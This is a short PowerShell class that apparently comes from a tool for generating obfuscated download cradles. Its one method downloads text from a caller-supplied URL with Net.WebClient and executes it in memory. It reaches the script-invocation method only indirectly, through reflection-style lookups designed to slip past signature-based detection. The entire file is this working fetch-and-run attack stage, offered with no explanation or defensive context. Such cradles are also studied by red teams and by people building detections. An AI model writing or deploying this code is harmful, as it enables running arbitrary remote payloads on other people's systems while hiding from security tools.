Class ObfDownloadFileContent13 {

    static Execute ([String]$url) {
        #CLI:  Memory\PsWebString\Invoke\7
        &($ExecutionContext.(($ExecutionContext|GM)[6].Name).(($ExecutionContext.(($ExecutionContext|GM)[6].Name).PsObject.Methods|Where{$_.Name-clike'*k'}).Name).Invoke((New-Object Net.WebClient).DownloadString($url)))
    }

}